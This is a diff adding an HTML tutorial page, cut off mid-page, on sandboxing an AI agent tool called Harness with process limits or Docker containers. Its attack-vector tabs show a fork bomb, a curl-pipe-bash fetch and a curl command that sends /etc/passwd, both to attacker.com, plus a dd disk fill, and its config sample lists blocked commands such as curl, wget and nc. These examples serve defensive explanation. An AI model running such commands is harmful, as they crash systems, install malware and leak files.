@@ -1,0 +1,1497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sandboxed Execution — Harness Tutorials</title>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+
+  <!-- Prism.js tomorrow theme -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:          #0F172A;
+      --surface:     #1E293B;
+      --accent:      #7C3AED;
+      --accent-light:#A78BFA;
+      --text:        #E2E8F0;
+      --heading:     #F8FAFC;
+      --muted:       #94A3B8;
+      --border:      #334155;
+      --info:        #3B82F6;
+      --warning:     #F59E0B;
+      --success:     #10B981;
+      --error:       #EF4444;
+      --sidebar-w:   280px;
+      --header-h:    60px;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.7;
+      font-size: 15px;
+    }
+
+    /* ── Header ── */
+    header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      height: var(--header-h);
+      background: rgba(15, 23, 42, 0.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      padding: 0 24px;
+      gap: 16px;
+    }
+
+    .brand {
+      font-weight: 700;
+      font-size: 20px;
+      color: var(--heading);
+      letter-spacing: -0.3px;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .brand-dot {
+      width: 8px; height: 8px;
+      background: var(--accent);
+      border-radius: 50%;
+    }
+
+    .header-meta {
+      margin-left: auto;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .badge {
+      font-size: 11px;
+      font-weight: 600;
+      padding: 3px 8px;
+      border-radius: 4px;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
+    }
+
+    .badge-intermediate {
+      background: rgba(245, 158, 11, 0.15);
+      color: var(--warning);
+      border: 1px solid rgba(245, 158, 11, 0.3);
+    }
+
+    .badge-time {
+      background: rgba(148, 163, 184, 0.1);
+      color: var(--muted);
+      border: 1px solid var(--border);
+    }
+
+    .mobile-menu-btn {
+      display: none;
+      background: none;
+      border: 1px solid var(--border);
+      color: var(--text);
+      padding: 6px 10px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 18px;
+      line-height: 1;
+    }
+
+    /* ── Layout ── */
+    .layout {
+      display: flex;
+      min-height: calc(100vh - var(--header-h));
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    /* ── Sidebar ── */
+    aside {
+      width: var(--sidebar-w);
+      flex-shrink: 0;
+      position: sticky;
+      top: var(--header-h);
+      height: calc(100vh - var(--header-h));
+      overflow-y: auto;
+      border-right: 1px solid var(--border);
+      padding: 28px 0;
+    }
+
+    aside::-webkit-scrollbar { width: 4px; }
+    aside::-webkit-scrollbar-track { background: transparent; }
+    aside::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+    .toc-label {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: var(--muted);
+      padding: 0 20px 12px;
+    }
+
+    .toc-list { list-style: none; }
+
+    .toc-list a {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px 20px;
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 13.5px;
+      border-left: 2px solid transparent;
+      transition: all 0.15s;
+    }
+
+    .toc-list a:hover,
+    .toc-list a.active {
+      color: var(--accent-light);
+      border-left-color: var(--accent);
+      background: rgba(124, 58, 237, 0.08);
+    }
+
+    .toc-num {
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--accent);
+      min-width: 18px;
+    }
+
+    /* ── Main ── */
+    main {
+      flex: 1;
+      padding: 48px 40px 80px;
+      max-width: 780px;
+    }
+
+    /* ── Page header ── */
+    .page-title {
+      font-size: 32px;
+      font-weight: 700;
+      color: var(--heading);
+      line-height: 1.2;
+      letter-spacing: -0.5px;
+      margin-bottom: 8px;
+    }
+
+    .page-subtitle {
+      color: var(--muted);
+      font-size: 15px;
+      margin-bottom: 24px;
+    }
+
+    .page-tags {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin-bottom: 40px;
+    }
+
+    /* ── Section headings ── */
+    .section-anchor { display: block; }
+
+    h2 {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--heading);
+      margin: 48px 0 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    h3 {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--heading);
+      margin: 28px 0 10px;
+    }
+
+    p { margin-bottom: 14px; }
+
+    /* ── Step indicator ── */
+    .step-num {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: var(--accent);
+      color: #fff;
+      font-size: 13px;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    /* ── Steps list with connecting lines ── */
+    .steps-list {
+      list-style: none;
+      padding-left: 0;
+      margin: 20px 0 24px;
+    }
+
+    .steps-list li {
+      display: flex;
+      gap: 16px;
+      position: relative;
+      padding-bottom: 24px;
+    }
+
+    .steps-list li:last-child { padding-bottom: 0; }
+
+    .steps-list li::before {
+      content: '';
+      position: absolute;
+      left: 13px;
+      top: 28px;
+      bottom: 0;
+      width: 2px;
+      background: var(--border);
+    }
+
+    .steps-list li:last-child::before { display: none; }
+
+    .step-circle {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 28px;
+      height: 28px;
+      min-width: 28px;
+      border-radius: 50%;
+      background: var(--accent);
+      color: #fff;
+      font-size: 13px;
+      font-weight: 700;
+      margin-top: 2px;
+    }
+
+    .step-content { flex: 1; }
+
+    .step-title {
+      font-weight: 600;
+      color: var(--heading);
+      margin-bottom: 4px;
+    }
+
+    /* ── Code blocks ── */
+    .code-block {
+      position: relative;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      margin: 16px 0 24px;
+      overflow: hidden;
+    }
+
+    .code-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 9px 14px;
+      border-bottom: 1px solid var(--border);
+      background: rgba(255, 255, 255, 0.03);
+    }
+
+    .code-header-left { display: flex; align-items: center; gap: 10px; }
+
+    .lang-badge {
+      font-size: 11px;
+      font-weight: 600;
+      padding: 2px 7px;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      background: rgba(124, 58, 237, 0.2);
+      color: var(--accent-light);
+      border: 1px solid rgba(124, 58, 237, 0.3);
+    }
+
+    .filename {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .copy-btn {
+      background: none;
+      border: 1px solid var(--border);
+      color: var(--muted);
+      font-size: 12px;
+      padding: 4px 10px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: all 0.15s;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .copy-btn:hover { border-color: var(--accent); color: var(--accent-light); }
+    .copy-btn.copied { border-color: var(--success); color: var(--success); }
+
+    .code-block pre {
+      margin: 0 !important;
+      padding: 16px 20px !important;
+      background: transparent !important;
+      font-family: 'JetBrains Mono', monospace !important;
+      font-size: 13.5px !important;
+      line-height: 1.65 !important;
+      overflow-x: auto;
+    }
+
+    .code-block pre::-webkit-scrollbar { height: 4px; }
+    .code-block pre::-webkit-scrollbar-track { background: transparent; }
+    .code-block pre::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+    /* ── Inline code ── */
+    code:not([class]) {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 1px 6px;
+      color: var(--accent-light);
+    }
+
+    /* ── Callouts ── */
+    .callout {
+      border-radius: 10px;
+      padding: 16px 18px;
+      margin: 20px 0;
+      border-left: 3px solid;
+      background: rgba(255,255,255,0.03);
+    }
+
+    .callout-header {
+      font-weight: 600;
+      font-size: 13px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .callout-info    { border-color: var(--info);    }
+    .callout-info    .callout-header { color: var(--info); }
+    .callout-warning { border-color: var(--warning); }
+    .callout-warning .callout-header { color: var(--warning); }
+    .callout-success { border-color: var(--success); }
+    .callout-success .callout-header { color: var(--success); }
+    .callout-error   { border-color: var(--error);   }
+    .callout-error   .callout-header { color: var(--error); }
+    .callout-tryit   { border-color: var(--accent);  }
+    .callout-tryit   .callout-header { color: var(--accent-light); }
+    .callout-competitor { border-color: var(--accent); background: rgba(124,58,237,0.07); }
+    .callout-competitor .callout-header { color: var(--accent-light); }
+
+    /* ── Tabs ── */
+    .tab-group { margin: 20px 0 24px; }
+
+    .tab-nav {
+      display: flex;
+      gap: 0;
+      border-bottom: 1px solid var(--border);
+      flex-wrap: wrap;
+    }
+
+    .tab-btn {
+      background: none;
+      border: none;
+      color: var(--muted);
+      padding: 10px 18px;
+      cursor: pointer;
+      font-size: 13.5px;
+      font-family: 'Inter', sans-serif;
+      font-weight: 500;
+      border-bottom: 2px solid transparent;
+      margin-bottom: -1px;
+      transition: all 0.15s;
+    }
+
+    .tab-btn:hover { color: var(--text); }
+    .tab-btn.active {
+      color: var(--accent-light);
+      border-bottom-color: var(--accent);
+    }
+
+    .tab-panel { display: none; padding-top: 4px; }
+    .tab-panel.active { display: block; }
+
+    /* ── Collapsible ── */
+    .collapsible { margin: 20px 0; }
+
+    .collapsible-trigger {
+      width: 100%;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      color: var(--text);
+      padding: 13px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      transition: border-color 0.15s;
+    }
+
+    .collapsible-trigger:hover { border-color: var(--accent); }
+    .collapsible-trigger[aria-expanded="true"] {
+      border-radius: 8px 8px 0 0;
+      border-color: var(--accent);
+    }
+
+    .chevron {
+      transition: transform 0.2s;
+      font-size: 16px;
+      color: var(--muted);
+    }
+
+    .collapsible-trigger[aria-expanded="true"] .chevron { transform: rotate(180deg); }
+
+    .collapsible-content {
+      background: var(--surface);
+      border: 1px solid var(--accent);
+      border-top: none;
+      border-radius: 0 0 8px 8px;
+      padding: 16px;
+      display: none;
+    }
+
+    .collapsible-content.open { display: block; }
+
+    /* ── Table ── */
+    .table-wrap { overflow-x: auto; margin: 16px 0 24px; }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13.5px;
+    }
+
+    thead th {
+      background: var(--surface);
+      color: var(--muted);
+      font-weight: 600;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      padding: 10px 14px;
+      text-align: left;
+      border-bottom: 1px solid var(--border);
+    }
+
+    tbody td {
+      padding: 10px 14px;
+      border-bottom: 1px solid rgba(51,65,85,0.5);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+    }
+
+    tbody tr:hover { background: rgba(255,255,255,0.02); }
+    .td-normal { font-family: 'Inter', sans-serif; }
+    .check { color: var(--success); font-family: 'Inter', sans-serif; font-size: 15px; }
+    .cross { color: var(--error); font-family: 'Inter', sans-serif; font-size: 15px; }
+
+    /* ── Mode comparison cards ── */
+    .mode-cards {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+      margin: 20px 0 24px;
+    }
+
+    .mode-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 18px;
+    }
+
+    .mode-card-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--heading);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .mode-tag {
+      font-size: 10px;
+      font-weight: 700;
+      padding: 2px 6px;
+      border-radius: 3px;
+      text-transform: uppercase;
+      letter-spacing: 0.4px;
+    }
+
+    .mode-tag-process {
+      background: rgba(59, 130, 246, 0.15);
+      color: var(--info);
+      border: 1px solid rgba(59, 130, 246, 0.3);
+    }
+
+    .mode-tag-docker {
+      background: rgba(16, 185, 129, 0.15);
+      color: var(--success);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+    }
+
+    .mode-card ul {
+      padding-left: 18px;
+      margin-bottom: 0;
+    }
+
+    .mode-card li {
+      font-size: 13px;
+      color: var(--muted);
+      margin-bottom: 4px;
+    }
+
+    @media (max-width: 600px) {
+      .mode-cards { grid-template-columns: 1fr; }
+    }
+
+    /* ── Result demo blocks ── */
+    .result-block {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 14px 16px;
+      margin: 12px 0;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+
+    .result-label {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .result-oom  { border-color: var(--error); }
+    .result-oom  .result-label { color: var(--error); }
+    .result-timeout { border-color: var(--warning); }
+    .result-timeout .result-label { color: var(--warning); }
+    .result-blocked { border-color: var(--warning); }
+    .result-blocked .result-label { color: var(--warning); }
+    .result-ok  { border-color: var(--success); }
+    .result-ok  .result-label { color: var(--success); }
+
+    /* ── Prev/Next nav ── */
+    .page-nav {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      margin-top: 60px;
+      padding-top: 32px;
+      border-top: 1px solid var(--border);
+    }
+
+    .nav-card {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      padding: 16px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      text-decoration: none;
+      transition: border-color 0.15s, background 0.15s;
+    }
+
+    .nav-card:hover { border-color: var(--accent); background: rgba(124,58,237,0.07); }
+    .nav-card.next { text-align: right; }
+
+    .nav-dir {
+      font-size: 11px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--muted);
+    }
+
+    .nav-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--heading);
+    }
+
+    /* ── Responsive ── */
+    @media (max-width: 1024px) {
+      aside {
+        position: fixed;
+        left: -100%;
+        top: var(--header-h);
+        height: calc(100vh - var(--header-h));
+        background: var(--bg);
+        z-index: 90;
+        border-right: 1px solid var(--border);
+        transition: left 0.25s;
+      }
+      aside.open { left: 0; }
+      .mobile-menu-btn { display: block; }
+      main { padding: 32px 20px 60px; max-width: 100%; }
+      .page-nav { grid-template-columns: 1fr; }
+    }
+
+    /* ── Misc ── */
+    hr { border: none; border-top: 1px solid var(--border); margin: 32px 0; }
+    ul, ol { padding-left: 22px; margin-bottom: 14px; }
+    li { margin-bottom: 5px; }
+    strong { color: var(--heading); font-weight: 600; }
+
+    /* ── Sidebar overlay ── */
+    .sidebar-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      top: var(--header-h);
+      background: rgba(0,0,0,0.5);
+      z-index: 89;
+    }
+    .sidebar-overlay.open { display: block; }
+  </style>
+</head>
+<body>
+
+<!-- ── Header ── -->
+<header>
+  <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Toggle sidebar" aria-expanded="false">&#9776;</button>
+  <a href="index.html" class="brand">
+    <span class="brand-dot"></span>
+    Harness
+  </a>
+  <span style="color:var(--border);font-size:18px;margin:0 4px">/</span>
+  <span style="color:var(--muted);font-size:14px">Tutorials</span>
+  <div class="header-meta">
+    <span class="badge badge-intermediate">Intermediate</span>
+    <span class="badge badge-time">20 min</span>
+  </div>
+</header>
+
+<div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+<!-- ── Layout ── -->
+<div class="layout">
+
+  <!-- ── Sidebar ── -->
+  <aside id="sidebar" role="navigation" aria-label="Table of contents">
+    <div class="toc-label">On this page</div>
+    <ul class="toc-list" id="tocList">
+      <li><a href="#why-sandbox" class="toc-link"><span class="toc-num">1</span>Why Sandbox?</a></li>
+      <li><a href="#process-sandbox" class="toc-link"><span class="toc-num">2</span>Process Sandbox</a></li>
+      <li><a href="#docker-sandbox" class="toc-link"><span class="toc-num">3</span>Docker Sandbox</a></li>
+      <li><a href="#toml-config" class="toc-link"><span class="toc-num">4</span>TOML Configuration</a></li>
+      <li><a href="#resource-limits" class="toc-link"><span class="toc-num">5</span>Trigger Resource Limits</a></li>
+      <li><a href="#cli-override" class="toc-link"><span class="toc-num">6</span>CLI Override</a></li>
+      <li><a href="#untrusted-runner" class="toc-link"><span class="toc-num">7</span>Build an Untrusted Code Runner</a></li>
+      <li><a href="#next-steps" class="toc-link"><span class="toc-num">8</span>Next Steps</a></li>
+    </ul>
+  </aside>
+
+  <!-- ── Main ── -->
+  <main>
+
+    <h1 class="page-title">Sandboxed Execution</h1>
+    <p class="page-subtitle">Isolate AI agent commands with dual-mode sandboxing — process-level <code>setrlimit</code> or full Docker containers — with configurable resource limits.</p>
+    <div class="page-tags">
+      <span class="badge badge-intermediate">Intermediate</span>
+      <span class="badge badge-time">20 min read</span>
+    </div>
+
+    <!-- ── 1. Why Sandbox? ── -->
+    <span class="section-anchor" id="why-sandbox"></span>
+    <h2><span class="step-num">1</span>Why Sandbox?</h2>
+
+    <p>
+      When you run <code>harness --permission bypass</code>, the agent executes commands without asking
+      for confirmation. That is powerful and efficient — but without isolation, it also means the agent
+      has unrestricted access to your system.
+    </p>
+
+    <div class="callout callout-warning">
+      <div class="callout-header">&#9888; Without a Sandbox</div>
+      <code>harness --permission bypass</code> gives an AI agent full access to your system.
+      That includes network, filesystem, and processes. Consider what happens if the agent is given
+      a malicious prompt or executes code from an untrusted source.
+    </div>
+
+    <p>Real-world attack vectors that sandboxing prevents:</p>
+
+    <div class="tab-group" role="tablist" aria-label="Attack vector examples">
+      <div class="tab-nav">
+        <button class="tab-btn active" role="tab" aria-selected="true" aria-controls="atk-fork" data-tab="fork">Fork Bomb</button>
+        <button class="tab-btn" role="tab" aria-selected="false" aria-controls="atk-miner" data-tab="miner">Crypto Miner</button>
+        <button class="tab-btn" role="tab" aria-selected="false" aria-controls="atk-exfil" data-tab="exfil">Exfiltration</button>
+        <button class="tab-btn" role="tab" aria-selected="false" aria-controls="atk-disk" data-tab="disk">Disk Fill</button>
+      </div>
+
+      <div class="tab-panel active" id="atk-fork" role="tabpanel">
+        <p style="margin-top:12px">A fork bomb creates unlimited child processes, consuming all system resources and crashing the machine.</p>
+        <div class="code-block">
+          <div class="code-header">
+            <div class="code-header-left"><span class="lang-badge">Bash</span></div>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          </div>
+          <pre><code class="language-bash">:(){ :|:& };:
+# Sandbox prevents: max_processes limit blocks this immediately</code></pre>
+        </div>
+      </div>
+
+      <div class="tab-panel" id="atk-miner" role="tabpanel">
+        <p style="margin-top:12px">A crypto miner installs and runs software in the background, consuming CPU indefinitely.</p>
+        <div class="code-block">
+          <div class="code-header">
+            <div class="code-header-left"><span class="lang-badge">Bash</span></div>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          </div>
+          <pre><code class="language-bash">curl -s http://attacker.com/miner | bash
+# Sandbox prevents: network blocked + blocked_commands includes curl</code></pre>
+        </div>
+      </div>
+
+      <div class="tab-panel" id="atk-exfil" role="tabpanel">
+        <p style="margin-top:12px">Data exfiltration sends sensitive files to an attacker-controlled server over the network.</p>
+        <div class="code-block">
+          <div class="code-header">
+            <div class="code-header-left"><span class="lang-badge">Bash</span></div>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          </div>
+          <pre><code class="language-bash">curl attacker.com -d @/etc/passwd
+# Sandbox prevents: network=none blocks all outbound connections</code></pre>
+        </div>
+      </div>
+
+      <div class="tab-panel" id="atk-disk" role="tabpanel">
+        <p style="margin-top:12px">Disk fill creates an enormous file, consuming all available storage and crashing services.</p>
+        <div class="code-block">
+          <div class="code-header">
+            <div class="code-header-left"><span class="lang-badge">Bash</span></div>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          </div>
+          <pre><code class="language-bash">dd if=/dev/zero of=bigfile bs=1G count=100
+# Sandbox prevents: max_file_size_mb limit blocks writes above the cap</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout callout-competitor">
+      <div class="callout-header">&#9889; Most Configurable in Market</div>
+      <p>OpenHands has Docker-only sandbox. SWE-Agent has basic containers. No one offers dual-mode
+      (process + Docker) with configurable resource limits like Harness.</p>
+      <div class="table-wrap" style="margin-top:14px;margin-bottom:0">
+        <table>
+          <thead>
+            <tr>
+              <th>Feature</th>
+              <th>Harness</th>
+              <th>OpenHands</th>
+              <th>SWE-Agent</th>
+              <th>Claude Code</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="td-normal">Process sandbox (no Docker)</td>
+              <td class="check">&#10003;</td>
+              <td class="cross">&#10007;</td>
+              <td class="cross">&#10007;</td>
+              <td class="cross">&#10007;</td>
+            </tr>
+            <tr>
+              <td class="td-normal">Docker sandbox</td>
+              <td class="check">&#10003;</td>
+              <td class="check">&#10003;</td>
+              <td class="check">&#10003;</td>
+              <td class="cross">&#10007;</td>
+            </tr>
+            <tr>
+              <td class="td-normal">Memory limits</td>
+              <td class="check">&#10003;</td>
+              <td class="td-normal" style="color:var(--muted)">Partial</td>
+              <td class="cross">&#10007;</td>
+              <td class="cross">&#10007;</td>
+            </tr>
+            <tr>
+              <td class="td-normal">CPU time limits</td>
+              <td class="check">&#10003;</td>
+              <td class="cross">&#10007;</td>
+              <td class="cross">&#10007;</td>
+              <td class="cross">&#10007;</td>
+            </tr>
+            <tr>
+              <td class="td-normal">Process count limits</td>
+              <td class="check">&#10003;</td>
+              <td class="cross">&#10007;</td>
+              <td class="cross">&#10007;</td>
+              <td class="cross">&#10007;</td>
+            </tr>
+            <tr>
+              <td class="td-normal">API key stripping</td>
+              <td class="check">&#10003;</td>
+              <td class="cross">&#10007;</td>
+              <td class="cross">&#10007;</td>
+              <td class="cross">&#10007;</td>
+            </tr>
+            <tr>
+              <td class="td-normal">Blocked command list</td>
+              <td class="check">&#10003;</td>
+              <td class="cross">&#10007;</td>
+              <td class="cross">&#10007;</td>
+              <td class="cross">&#10007;</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ── 2. Process Sandbox ── -->
+    <span class="section-anchor" id="process-sandbox"></span>
+    <h2><span class="step-num">2</span>Process Sandbox</h2>
+
+    <p>
+      The process sandbox uses POSIX <code>setrlimit</code> system calls — the same mechanism the OS
+      uses to enforce per-process resource limits. No Docker required.
+    </p>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Resource Limit</th>
+            <th>System Call</th>
+            <th>What It Controls</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>max_memory_mb</code></td>
+            <td><code>RLIMIT_AS</code></td>
+            <td class="td-normal">Total virtual memory the process can address</td>
+          </tr>
+          <tr>
+            <td><code>max_cpu_seconds</code></td>
+            <td><code>RLIMIT_CPU</code></td>
+            <td class="td-normal">CPU time before SIGXCPU / SIGKILL is sent</td>
+          </tr>
+          <tr>
+            <td><code>max_processes</code></td>
+            <td><code>RLIMIT_NPROC</code></td>
+            <td class="td-normal">Number of child processes the command can fork</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout callout-info">
+      <div class="callout-header">&#8505; max_file_size_mb is Docker-only</div>
+      The <code>max_file_size_mb</code> limit is enforced only in Docker sandbox mode via the container
+      runtime's storage limits. The process sandbox does not set <code>RLIMIT_FSIZE</code> —
+      only <code>RLIMIT_AS</code>, <code>RLIMIT_CPU</code>, and <code>RLIMIT_NPROC</code> are applied.
+    </div>
+
+    <div class="mode-cards">
+      <div class="mode-card">
+        <div class="mode-card-title"><span class="mode-tag mode-tag-process">Advantages</span></div>
+        <ul>
+          <li>No Docker installation required</li>
+          <li>Minimal overhead — native OS calls</li>
+          <li>Works on Linux and macOS</li>
+          <li>Instant startup — no container spin-up</li>
+        </ul>
+      </div>
+      <div class="mode-card">
+        <div class="mode-card-title"><span class="mode-tag mode-tag-docker" style="background:rgba(239,68,68,0.1);color:var(--error);border-color:rgba(239,68,68,0.3)">Limitations</span></div>
+        <ul>
+          <li>Shared filesystem with host</li>
+          <li>Not as strong as container isolation</li>
+          <li>No network namespace separation</li>
+          <li>Suitable for trusted-but-resource-limited code</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-header-left">
+          <span class="lang-badge">Bash</span>
+        </div>
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+      </div>
+      <pre><code class="language-bash">harness --sandbox process "Run the test suite"</code></pre>
+    </div>
+
+    <!-- ── 3. Docker Sandbox ── -->
+    <span class="section-anchor" id="docker-sandbox"></span>
+    <h2><span class="step-num">3</span>Docker Sandbox</h2>
+
+    <p>
+      The Docker sandbox runs every command in an isolated container. It provides the strongest
+      isolation available — separate filesystem, network namespace, and process tree.
+    </p>
+
+    <ul>
+      <li><code>--network=none</code> — no network access by default (unless <code>network_access = true</code>)</li>
+      <li><code>--memory</code> — hard memory cap enforced by the container runtime</li>
+      <li><code>--cpus</code> — CPU share limit</li>
+      <li><strong>API key stripping</strong> — <code>ANTHROPIC_API_KEY</code>, <code>OPENAI_API_KEY</code>,
+        <code>AWS_SECRET_ACCESS_KEY</code>, and others are removed from the environment automatically</li>
+    </ul>
+
+    <div class="callout callout-info">
+      <div class="callout-header">&#8505; API Key Stripping Applies to Both Modes</div>
+      API keys are automatically stripped from the environment in both process and Docker sandbox modes.
+      You cannot accidentally expose credentials to agent-executed commands regardless of which sandbox
+      mode you use.
+    </div>
+
+    <div class="mode-cards">
+      <div class="mode-card">
+        <div class="mode-card-title"><span class="mode-tag mode-tag-docker">Advantages</span></div>
+        <ul>
+          <li>Full filesystem isolation</li>
+          <li>Network namespace — <code>--network=none</code></li>
+          <li>Strongest isolation available</li>
+          <li>Custom images for reproducible envs</li>
+        </ul>
+      </div>
+      <div class="mode-card">
+        <div class="mode-card-title"><span class="mode-tag mode-tag-docker" style="background:rgba(239,68,68,0.1);color:var(--error);border-color:rgba(239,68,68,0.3)">Requirements</span></div>
+        <ul>
+          <li>Docker must be installed</li>
+          <li>Docker daemon must be running</li>
+          <li>Slower startup than process mode</li>
+          <li>Image pull required on first use</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-header-left">
+          <span class="lang-badge">Bash</span>
+        </div>
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+      </div>
+      <pre><code class="language-bash">harness --sandbox docker "Run the test suite"
+# Requires: Docker installed and daemon running
+# Default image: python:3.12-slim</code></pre>
+    </div>
+
+    <!-- ── 4. TOML Configuration ── -->
+    <span class="section-anchor" id="toml-config"></span>
+    <h2><span class="step-num">4</span>TOML Configuration</h2>
+
+    <p>Configure sandboxing persistently in <code>.harness/config.toml</code>:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-header-left">
+          <span class="lang-badge">TOML</span>
+          <span class="filename">.harness/config.toml</span>
+        </div>
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+      </div>
+      <pre><code class="language-toml">[sandbox]
+enabled = true
+mode = "process"              # "none", "process", or "docker"
+max_memory_mb = 512           # Memory limit per command
+max_cpu_seconds = 30          # CPU time limit per command
+network_access = false        # Block network access
+docker_image = "python:3.12-slim"  # Docker image (docker mode only)
+allowed_paths = [
+    "/home/user/project",     # Only allow access to project dir
+    "/tmp",                   # And temp directory
+]
+blocked_commands = [
+    "rm -rf /",               # Block dangerous commands
+    "curl",                   # Block network tools
+    "wget",
+    "nc",
+]</code></pre>
+    </div>
+
+    <div class="callout callout-info">
+      <div class="callout-header">&#8505; SandboxConfig vs SandboxPolicy</div>
+      The TOML <code>[sandbox]</code> section maps to <code>SandboxConfig</code> — a simple,
+      flat configuration dataclass used for file-based configuration. When the engine starts a session,
+      it converts <code>SandboxConfig</code> into a <code>SandboxPolicy</code> (the runtime struct),
+      which includes the nested <code>ResourceLimits</code> and <code>NetworkPolicy</code> sub-objects.
+      If you are building pipelines programmatically, construct <code>SandboxPolicy</code> directly
+      (see the Deep Dive below) rather than going through <code>SandboxConfig</code>.
+    </div>
+
+    <div class="collapsible" id="deep-policy">
+      <button class="collapsible-trigger" aria-expanded="false" aria-controls="deep-policy-content" onclick="toggleCollapsible(this)">
+        <span>&#128216; Deep Dive: Full SandboxPolicy SDK Reference</span>
+        <span class="chevron">&#8964;</span>
+      </button>
+      <div class="collapsible-content" id="deep-policy-content">
+        <p style="margin-bottom:14px">The complete type hierarchy — use these dataclasses directly when building custom sandboxed pipelines:</p>
+        <div class="code-block" style="margin-top:0">
+          <div class="code-header">
+            <div class="code-header-left"><span class="lang-badge">Python</span></div>
